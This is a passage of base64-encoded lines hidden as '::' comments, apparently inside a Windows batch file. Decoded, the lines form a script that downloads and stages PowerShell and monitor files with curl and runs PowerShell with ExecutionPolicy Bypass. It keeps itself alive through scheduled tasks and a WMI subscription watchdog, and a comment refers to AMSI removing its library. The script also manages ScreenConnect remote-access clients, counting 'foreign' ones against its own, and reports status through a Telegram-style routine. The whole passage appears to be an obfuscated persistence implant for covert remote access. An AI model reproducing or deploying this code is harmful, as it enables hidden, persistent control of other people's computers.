::b3duX2xpYi5uZXciKSBkbyBpZiAlJX56RiBHVFIgMTUwMCBtb3ZlIC95ICIlU1RB
::R0UlXG93bl9saWIubmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxDQog
::IGZpbmRzdHIgL0M6Ik9XTl9HUllYQSBCVUlMRCIgIiVTVEFHRSVcb3duX2dyeXhh
::Lm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlU1RBR0UlXG93bl9ncnl4
::YS5uZXciKSBkbyBpZiAlJX56RiBHVFIgNTAwIG1vdmUgL3kgIiVTVEFHRSVcb3du
::X2dyeXhhLm5ldyIgIiVXRCVcb3duX2dyeXhhLmNtZCIgPm51bCAyPiYxDQogIHNl
::dCAiU0VMRl9VUEQ9MCINCiAgZmluZHN0ciAvQzoiT1dOX01PTiAgQlVJTEQiICIl
::U1RBR0UlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxDQogIGlmIG5vdCBlcnJvcmxl
::dmVsIDEgZm9yICUlRiBpbiAoIiVTVEFHRSVcb3duX21vbi5uZXh0IikgZG8gaWYg
::JSV+ekYgR1RSIDE1MDAgKA0KICAgIGZjIC9iICIlU1RBR0UlXG93bl9tb24ubmV4
::dCIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KICAgIGlmIGVycm9ybGV2
::ZWwgMSBzZXQgIlNFTEZfVVBEPTEiDQogICkNCiAgaWYgIiVTRUxGX1VQRCUiPT0i
::MCIgZGVsIC9mIC9xICIlU1RBR0UlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxDQop
::IGVsc2UgKA0KICBkZWwgL2YgL3EgIiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIgIiVT
::VEFHRSVcb3duX3NlY3VyZS5uZXciICIlU1RBR0UlXG93bl9saWIubmV3IiAiJVNU
::QUdFJVxvd25fbW9uLm5leHQiICIlU1RBR0UlXG93bl9ncnl4YS5uZXciID5udWwg
::Mj4mMQ0KICBzZXQgIlNFTEZfVVBEPTAiDQopDQpkZWwgL2YgL3EgIiVTVEFHRSVc
::dGdfcmVwb3J0Lm5ldyIgIiVTVEFHRSVcb3duX3NlY3VyZS5uZXciICIlU1RBR0Ul
::XG93bl9saWIubmV3IiAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiA+bnVsIDI+JjEN
::CmRlbCAvZiAvcSAiJVNUQUdFJVx1cGRhdGUubWFuaWZlc3QiICIlU1RBR0UlXHVw
::ZGF0ZS5tYW5pZmVzdC5zaWciID5udWwgMj4mMQ0KDQpyZW0gTTQzOiBpZiBsaWIg
::c3RpbGwgbWlzc2luZyAoQU1TSSB3aXBlZCBpdCAvIG5ldmVyIGxhbmRlZCksIGtl
::ZXAgYSBURU1QIGNvcHkgZm9yIGZhbGxiYWNrcw0KaWYgbm90IGV4aXN0ICIlV0Ql
::XG93bl9saWIucHMxIiBpZiBleGlzdCAiJVNUQUdFJVxvd25fbGliLm5ldyIgY29w
::eSAveSAiJVNUQUdFJVxvd25fbGliLm5ldyIgIiVXRCVcb3duX2xpYi5wczEiID5u
::dWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9ncnl4YS5jbWQiICgNCiAg
::IiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDgg
::LS1tYXgtdGltZSAyMCAtbyAiJVdEJVxvd25fZ3J5eGEuY21kIiAiJU9XTkdSWVhB
::JSIgPm51bCAyPiYxDQogIGlmIG5vdCBleGlzdCAiJVdEJVxvd25fZ3J5eGEuY21k
::IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMjAg
::LW8gIiVXRCVcb3duX2dyeXhhLmNtZCIgIiVPV05HUllYQTIlIiA+bnVsIDI+JjEN
::CikNCg0KcmVtIE00Mjogc2V2cnouY2ZnIGR5bmFtaWMgRlAgZnJvbSByZXBvIHNl
::dnJ6X2V4cGVjdGVkLmNmZw0KaWYgZXhpc3QgIiVXRCVcc2V2cnouY2ZnIiBmb3Ig
::L2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVc
::c2V2cnouY2ZnIikgZG8gKA0KICBpZiAvSSAiJSVLIj09IlBSSU1BUllfRlAiIHNl
::dCAiS0VFUF9GUD0lJUwiDQogIGlmIC9JICIlJUsiPT0iQUxUX0ZQIiBzZXQgIkFM
::VF9GUD0lJUwiDQopDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25u
::ZWN0LXRpbWVvdXQgNiAtLW1heC10aW1lIDIwIC1vICIlU1RBR0UlXHNldnJ6X2V4
::cGVjdGVkLm5ldyIgIiVTRVZSWl9FWFBfVVJMJSIgPm51bCAyPiYxDQppZiBub3Qg
::ZXhpc3QgIiVTVEFHRSVcc2V2cnpfZXhwZWN0ZWQubmV3IiAiJUNVUkwlIiAtTCAt
::LWNvbm5lY3QtdGltZW91dCA2IC0tbWF4LXRpbWUgMjAgLW8gIiVTVEFHRSVcc2V2
::cnpfZXhwZWN0ZWQubmV3IiAiJVNFVlJaX0VYUF9VUkwyJSIgPm51bCAyPiYxDQpp
::ZiBleGlzdCAiJVNUQUdFJVxzZXZyel9leHBlY3RlZC5uZXciIGlmIGV4aXN0ICIl
::V0QlXG93bl9saWIucHMxIiAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIg
::JSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::RXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiJHQ9R2V0LUNvbnRlbnQg
::LUxpdGVyYWxQYXRoICclU1RBR0UlXHNldnJ6X2V4cGVjdGVkLm5ldycgLVJhdzsg
::JiAnJVdEJVxvd25fbGliLnBzMScgLUFjdGlvbiBzeW5jLXNldnJ6LWZwIC1Xb3Jr
::RGlyICclV0QlJyAtRXh0cmEgJHQiYCkgZG8gKA0KICAgIGVjaG8gc2V2cnpfc3lu
::YyAlJVI+PiIlTE9HJSINCiAgICBmb3IgL2YgInRva2Vucz0yLDMgZGVsaW1zPXwi
::ICUlQSBpbiAoIiUlUiIpIGRvICgNCiAgICAgIGlmIG5vdCAiJSVBIj09IiIgc2V0
::ICJLRUVQX0ZQPSUlQSINCiAgICAgIGlmIG5vdCAiJSVCIj09IiIgc2V0ICJBTFRf
::RlA9JSVCIg0KICAgICkNCiAgKQ0KKQ0KZGVsIC9mIC9xICIlU1RBR0UlXHNldnJ6
::X2V4cGVjdGVkLm5ldyIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxzZXZyei5j
::ZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGlu
::ICgiJVdEJVxzZXZyei5jZmciKSBkbyAoDQogIGlmIC9JICIlJUsiPT0iUFJJTUFS
::WV9GUCIgc2V0ICJLRUVQX0ZQPSUlTCINCiAgaWYgL0kgIiUlSyI9PSJBTFRfRlAi
::IHNldCAiQUxUX0ZQPSUlTCINCikNCg0KcmVtIOKUgOKUgCBbQl0gcmUtYXJtIGNo
::YWluIDE6IG93bmVyc2hpcC1hd2FyZSAobm90IGV4aXN0ZW5jZS1vbmx5KSDilIDi
::lIANCnJlbSBMMTEvTTIyOiBRdWVyeS1vbmx5IHNraXBwZWQgcmVhcm0gd2hlbiBX
::aW5kb3dzIGJ1aWx0LWluIHRhc2tzIHNoYXJlZA0KcmVtIGRlZmF1bHQgbmFtZXMg
::KERpYWdub3Npc1xTY2hlZHVsZWQgZXRjLikgLT4gbW9uIG5ldmVyIHJhbiwgbm8g
::bG9nLg0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgNCiAgZm9yIC9mICJ1
::c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
::LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIl
::V0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHRhc2tzLWVuc3VyZSAtV29ya0RpciAi
::JVdEJSIgLU1vblBhdGggIiVXRCVcb3duX21vbi5jbWQiYCkgZG8gKA0KICAgIGVj
::aG8gdGFza3NfZW5zdXJlICUlUj4+IiVMT0clIg0KICAgIHNldCAiVEFTS1NfRU5T
::VVJFPSUlUiINCiAgKQ0KKQ0KaWYgbm90IGV4aXN0ICIlRVRMJSIgbWtkaXIgIiVF
::VEwlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXG93bl9tb24uY21kIiAoDQog
::IGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0K
::ICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVUTCVcZXRsX21vbi5jbWQi
::ID5udWwgMj4mMQ0KKQ0KDQpyZW0g4pSA4pSAIFtCMl0gcmUtYXJtIGNoYWluIDIg
::KFdNSSBzdWJzY3JpcHRpb24pIGlmIG1pc3Npbmcg4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICBmb3Ig
::L2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJv
::ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
::bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gd2F0Y2hkb2ctZW5zdXJlIC1X
::b3JrRGlyICIlV0QlIiAtTW9uUGF0aCAiJVdEJVxvd25fbW9uLmNtZCJgKSBkbyBz
::ZXQgIldEX1NUQVRFPSUlUiINCiAgaWYgL0kgIiFXRF9TVEFURSEiPT0iUkVBUk1F
::RCIgZWNobyB3YXRjaGRvZyBXTUkgUkVBUk1FRD4+IiVMT0clIg0KKQ0KDQpyZW0g
::4pSA4pSAIFtFMF0gc3luYyBHcnl4YSBGUCBmcm9tIHZlcmlmaWVkIGdyeXhhLmNv
::bSBTQyBCRUZPUkUgZXh0ZXJtaW5hdGUg4pSA4pSADQppZiBleGlzdCAiJVdEJVxv
::d25fbGliLnBzMSIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
::YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
::aWIucHMxIiAtQWN0aW9uIHN5bmMtZ3J5eGEtZnAgLVdvcmtEaXIgIiVXRCUiID5u
::dWwgMj4mMQ0KICBpZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNl
::YmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5j
::ZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9
::JSVMIg0KKQ0KDQpyZW0g4pSA4pSAIFtFXSBMNDUvTTQ4IEhBTkRTLU9GRjogc2tp
::cCBleHRlcm1pbmF0ZSAoZG8gbm90IHRvdWNoIGFueSBTY3JlZW5Db25uZWN0KSDi
::lIDilIANCmVjaG8gaGFuZHNfb2ZmX3NraXBfZXh0ZXJtaW5hdGU+PiIlTE9HJSIN
::CnNldCAiRk9SRUlHTl9MRUZUPTAiDQpmb3IgL2YgInRva2Vucz0yIGRlbGltcz0o
::KSIgJSVhIGluICgnc2MgcXVlcnkgc3RhdGVePSBhbGwgXnwgZmluZHN0ciAvQzoi
::U0VSVklDRV9OQU1FOiBTY3JlZW5Db25uZWN0IENsaWVudCInKSBkbyAoDQogIHNl
::dCAiRlA9JSVhIg0KICBzZXQgIkZQPSFGUDogPSEiDQogIHJlbSBmcmllbmRseSBp
::ZiBrZWVwZXIgRlAgT1IgZ3J5eGEtcmVsYXkgKEltYWdlUGF0aCBoYXMgZ3J5eGEu
::Y29tKSDigJQgbmV2ZXIgY291bnQgbmV3IEdyeXhhIGFzIGZvcmVpZ24NCiAgc2V0
::ICJGUklFTkRMWT0wIg0KICBpZiAvSSAiIUZQISI9PSIlS0VFUF9GUCUiIHNldCAi
::RlJJRU5ETFk9MSINCiAgaWYgL0kgIiFGUCEiPT0iJUFMVF9GUCUiIHNldCAiRlJJ
::RU5ETFk9MSINCiAgaWYgL0kgIiFGUCEiPT0iJUdSWVhBX0ZQJSIgc2V0ICJGUklF
::TkRMWT0xIg0KICBpZiAiIUZSSUVORExZISI9PSIwIiAoDQogICAgZm9yIC9mICJ1
::c2ViYWNrcSBkZWxpbXM9IiAlJUkgaW4gKGByZWcgcXVlcnkgIkhLTE1cU1lTVEVN
::XEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFNjcmVlbkNvbm5lY3QgQ2xpZW50
::ICghRlAhKSIgL3YgSW1hZ2VQYXRoIDJePm51bCBefCBmaW5kc3RyIC9JICJJbWFn
::ZVBhdGgiYCkgZG8gKA0KICAgICAgZWNobyAlJUkgfCBmaW5kc3RyIC9JICJncnl4
::YS5jb20iID5udWwgJiYgc2V0ICJGUklFTkRMWT0xIg0KICAgICkNCiAgKQ0KICBp
::ZiAiIUZSSUVORExZISI9PSIwIiAoDQogICAgc2V0IC9hIENPVU5UKz0xDQogICAg
::c2V0IC9hIEZPUkVJR05fTEVGVCs9MQ0KICAgIHNldCAiRk9SRUlHTl9MSVNUPSFG
::T1JFSUdOX0xJU1QhIUZQISAiDQogICAgZWNobyBmb3JlaWduX2xlZnRfIUZQIT4+
::IiVMT0clIg0KICApDQopDQoNCnJlbSDilIDilIAgW0NdIGhlYWwgU2NyZWVuQ29u
::bmVjdCBwcmltL2FsdCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIANCmZvciAvZiAidG9rZW5zPTEsMiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1
::ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgXnwgZmluZHN0
::ciAvQzoiU0VSVklDRV9OQU1FIicpIGRvICgNCiAgc2V0ICJJTlNUQUxMRUQ9MSIN
::CiAgc2V0ICJQUklNU1RBVEU9JSViIg0KKQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCmlm
::IG5vdCBlcnJvcmxldmVsIDEgKA0KICBzZXQgIlBSSU1fT0s9MSINCiAgc2V0IC9h
::IENPVU5UKz0xDQopDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVB
::TFRfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAvYSBD
::T1VOVCs9MQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQ
::JSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSBz
::ZXQgIkFMVF9PSz0xIg0KDQppZiAiJUlOU1RBTExFRCUiPT0iMSIgaWYgIiVQUklN
::X09LJSI9PSIwIiAoDQogIGVjaG8gc3ZjIGhlYWwgcmVzdGFydD4+IiVMT0clIg0K
::ICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+
::bnVsIDI+JjENCiAgc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
::UF9GUCUpIiA+bnVsIDI+JjENCiAgdGltZW91dCAvdCA2IC9ub2JyZWFrID5udWwN
::CiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8
::IGZpbmQgIlJVTk5JTkciID5udWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQg
::IlBSSU1fT0s9MSINCikNCnJlbSBNMTY6IHN0aWxsIHN0b3BwZWQgLT4gcmVwYWly
::IHRoZSBSRUdJU1RFUkVEIHByb2R1Y3QgKG1zaWV4ZWMgL2ZhIHJlc3RvcmVzDQpy
::ZW0gYmluYXJpZXMgKyBzdGFydHMgdGhlIHNlcnZpY2U7IEw1IFJlcGFpci1TQ1Nl
::cnZpY2UgaGFuZGxlcyBzdG9wcGVkIHN2Y3MpDQppZiAiJUlOU1RBTExFRCUiPT0i
::MSIgaWYgIiVQUklNX09LJSI9PSIwIiAoDQogIGVjaG8gc3ZjIGVzY2FsYXRlIHJl
::cGFpcj4+IiVMT0clIg0KICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93
::ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9s
::aWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBh
::aXIgLUZwICIlS0VFUF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4m
::MQ0KICB0aW1lb3V0IC90IDggL25vYnJlYWsgPm51bA0KICBzYyBxdWVyeSAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIg
::Pm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9PSz0xIg0KKQ0K
::cmVtIE0xNjogb3JwaGFuZWQgc2VydmljZSBlbnRyeSAocHJvZHVjdCB1bnJlZ2lz
::dGVyZWQgLSBlYXRlbiBieSBhbiBTQy1mYW1pbHkNCnJlbSB1cGdyYWRlIHJlbW92
::YWwpIGNhbiBORVZFUiBzdGFydC4gRGVsZXRlIGl0IGFuZCBmYWxsIHRocm91Z2gg
::dG8gdGhlDQpyZW0gZnJlc2gtaW5zdGFsbCBsYWRkZXIgYmVsb3cgaW5zdGVhZCBv
::ZiBhbGVydGluZyAid29udCBzdGFydCIgZm9yZXZlci4NCmlmICIlSU5TVEFMTEVE
::JSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgc2V0ICJSRUdTVEFURT11
::bmtub3duIg0KICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJk
::ZWxpbXM9IiAlJVIgaW4gKCdwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
::YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
::aWIucHMxIiAtQWN0aW9uIHJlZ2lzdGVyZWQgLUZwICIlS0VFUF9GUCUiIC1Xb3Jr
::RGlyICIlV0QlIicpIGRvIHNldCAiUkVHU1RBVEU9JSVSIg0KICBlY2hvIG9ycGhh
::bl9jaGVjaz0hUkVHU1RBVEUhPj4iJUxPRyUiDQogIGlmIC9JICIhUkVHU1RBVEUh
::Ij09Im5vIiAoDQogICAgZWNobyBvcnBoYW5fc2VydmljZV9kZWxldGVfU0tJUFBF
::RF9oYW5kc19vZmY+PiIlTE9HJSINCiAgICByZW0gTTQ4OiBuZXZlciBzYyBkZWxl
::dGUgYW55IFNjcmVlbkNvbm5lY3QNCg0KICApDQopDQppZiAiJUlOU1RBTExFRCUi
::PT0iMSIgaWYgIiVQUklNX09LJSI9PSIwIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJv
::ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
::bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVX
::RCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInN2Yy13b250LXN0YXJ0IiA+bnVs
::IDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBET1dOICJTY3JlZW5Db25uZWN0ICglS0VF
::UF9GUCUpIGluc3RhbGxlZCBidXQgd29udCBzdGFydCINCiAgZ290byA6QWZ0ZXJI
::ZWFsDQopDQppZiAiJUlOU1RBTExFRCUiPT0iMSIgZ290byA6QWZ0ZXJIZWFsDQoN
::CnJlbSDilIDilIAgW0RdIHByaW1hcnkgU0MgbWlzc2luZyAtIGhlYWwgbGFkZGVy
::IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgA0KcmVtIE0xMjogRklSU1QgcmVwYWlyIHRoZSBy
::ZWdpc3RlcmVkIHByb2R1Y3QgKHJlY3JlYXRlcyBzZXJ2aWNlIHdpdGhvdXQNCnJl
::bSB0b3VjaGluZyB0aGUgQUxUIGluc3RhbmNlKTsgZnJlc2ggbXNpZXhlYyBpbnN0
::YWxsIG9ubHkgYXMgZmFsbGJhY2suDQplY2hvIHN2YyBtaXNzaW5nIC0gaGVhbCBi
::ZWdpbj4+IiVMT0clIg0KY2FsbCA6UmVwYWlyUmVnaXN0ZXJlZCAiJUtFRVBfRlAl
::Ig0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8
::IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBz
::ZXQgIklOU1RBTExFRD0xIg0KICBzZXQgIlBSSU1fT0s9MSINCiAgZ290byA6QWZ0
::ZXJIZWFsDQopDQpyZW0gcmVmdXNlIGZyZXNoIC9pIGlmIHByb2R1Y3Qgc3RpbGwg
::cmVnaXN0ZXJlZCAtIFVwZ3JhZGUgdGFibGUgY2FuIHdpcGUgQUxUL0dSWVhBDQpz
::ZXQgIlJFR1NUQVRFPXVua25vd24iDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBz
::MSIgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxs
::IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
::YXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlZ2lzdGVyZWQg
::LUZwICIlS0VFUF9GUCUiIC1Xb3JrRGlyICIlV0QlImApIGRvIHNldCAiUkVHU1RB
::VEU9JSVSIg0KaWYgL0kgIiFSRUdTVEFURSEiPT0ieWVzIiAoDQogIGVjaG8gcHJp
::bWFyeV9yZWdpc3RlcmVkX3NraXBfZnJlc2hfaW5zdGFsbD4+IiVMT0clIg0KICBw
::b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
::b2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0
::YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJyZWdp
::c3RlcmVkLXN0dWNrIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBET1dOICJQ
::cmltYXJ5IHJlZ2lzdGVyZWQgYnV0IHNlcnZpY2UgbWlzc2luZyAtIC9mYSBmYWls
::ZWQ7IHJlZnVzZWQgL2kgdG8gcHJvdGVjdCBBTFQvR1JZWEEiDQogIGdvdG8gOkFm
::dGVySGVhbA0KKQ0KcmVtIE8zNzogcmVmdXNlIHNldnJ6IC9pIHdoZW4gZ3J5eGEg
::YWxyZWFkeSBwcmVzZW50IOKAlCBzaGFyZWQgbGVnYWN5IFVwZ3JhZGVDb2Rlcw0K
::cmVtIHswQzk0NDQ4Qn0vezFGODVEN0ZFfSBtYWtlIHNpYmxpbmcgbXNpZXhlYyAv
::aSBrbm9jayBHcnl4YSBPRkZMSU5FIGluIHBhbmVsLg0KcmVtIE0zNjogZGV0ZWN0
::IEdyeXhhIGJ5IHJlbGF5IGRvbWFpbiB0b28gKGFueSBydW5uaW5nIGdyeXhhLmNv
::bSBTQyksIG5vdCBvbmx5IGJ5IEZQLg0Kc2V0ICJHUkVHPXVua25vd24iDQppZiBl
::eGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9
::IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
::IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMx
::IiAtQWN0aW9uIHJlZ2lzdGVyZWQgLUZwICIlR1JZWEFfRlAlIiAtV29ya0RpciAi
::JVdEJSJgKSBkbyBzZXQgIkdSRUc9JSVSIg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3Js
::ZXZlbCAxIHNldCAiR1JFRz15ZXMiDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBD
::bGllbnQgKDM2ZTUwNmZmMDE2YjIxNTEpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJv
::cmxldmVsIDEgc2V0ICJHUkVHPXllcyINCnJlbSBhbnkgbm9uLXNldnJ6IFJ1bm5p
::bmcvUGVuZGluZyBTQyBPUiBJbWFnZVBhdGggZ3J5eGEuY29tID0gR3J5eGEgcHJl
::c2VudA0KZm9yIC9mICJ0b2tlbnM9MiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1
::ZXJ5IHN0YXRlXj0gYWxsIF58IGZpbmRzdHIgL0M6IlNFUlZJQ0VfTkFNRTogU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQiJykgZG8gKA0KICBzZXQgIl9GUD0lJWEiDQogIHNl
::dCAiX0ZQPSFfRlA6ID0hIg0KICBpZiAvSSBub3QgIiFfRlAhIj09IiVLRUVQX0ZQ
::JSIgaWYgL0kgbm90ICIhX0ZQISI9PSIlQUxUX0ZQJSIgKA0KICAgIHNjIHF1ZXJ5
::ICJTY3JlZW5Db25uZWN0IENsaWVudCAoIV9GUCEpIiB8IGZpbmRzdHIgL0kgL0M6
::IlJVTk5JTkciIC9DOiJTVEFSVF9QRU5ESU5HIiA+bnVsDQogICAgaWYgbm90IGVy
::cm9ybGV2ZWwgMSBzZXQgIkdSRUc9eWVzIg0KICApDQogIGZvciAvZiAidXNlYmFj
::a3EgZGVsaW1zPSIgJSVJIGluIChgcmVnIHF1ZXJ5ICJIS0xNXFNZU1RFTVxDdXJy
::ZW50Q29udHJvbFNldFxTZXJ2aWNlc1xTY3JlZW5Db25uZWN0IENsaWVudCAoIV9G
::UCEpIiAvdiBJbWFnZVBhdGggMl4+bnVsIF58IGZpbmRzdHIgL0kgIkltYWdlUGF0
::aCJgKSBkbyAoDQogICAgZWNobyAlJUkgfCBmaW5kc3RyIC9JICJncnl4YS5jb20i
::ID5udWwgJiYgc2V0ICJHUkVHPXllcyINCiAgKQ0KKQ0KaWYgL0kgIiFHUkVHISI9
::PSJ5ZXMiICgNCiAgZWNobyBwcmltYXJ5X3NraXBfaV9wcm90ZWN0X2dyeXhhPj4i
::JUxPRyUiDQogIGVjaG8gaGFuZHNfb2ZmX2dyeXhhX3ByZXNlbnRfc2tpcF9zZXZy
::ej4+IiVMT0clIg0KICBjYWxsIDpFbnN1cmVHcnl4YU11c3QNCiAgZ290byA6QWZ0
::ZXJIZWFsDQopDQpyZW0gTTQ4IEhBTkRTLU9GRjogc2tpcCBhbGwgc2V2cnogbXNp
::ZXhlYyAvaSAvIHNjLWZhbWlseSBpbnN0YWxscw0KZWNobyBoYW5kc19vZmZfc2tp
::cF9zZXZyel9tc2k+PiIlTE9HJSINCmNhbGwgOkVuc3VyZUdyeXhhTXVzdA0KZ290
::byA6QWZ0ZXJIZWFsDQpjYWxsIDpSZXN0b3JlQWx0DQpjYWxsIDpFbnN1cmVHcnl4
::YU11c3QNCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAoDQogIGlmIGV4aXN0ICIlV0Ql
::XG1zaV9oZWFsLmxvZyIgKA0KICAgIGVjaG8gLS0tIG1zaV9oZWFsLmxvZyB0YWls
::IC0tLT4+IiVMT0clIg0KICAgIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUNvbW1hbmQgIkdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAnJVdE
::JVxtc2lfaGVhbC5sb2cnIC1UYWlsIDEwIiA+PiIlTE9HJSIgMj4mMQ0KICApDQog
::IGlmIG5vdCBkZWZpbmVkIE1TSUVYSVQgc2V0ICJNU0lFWElUPWZldGNoLWZhaWwi
::DQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
::dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
::b24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEg
::Im1zaS1mYWlsZWQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIEZBSUwgIk1T
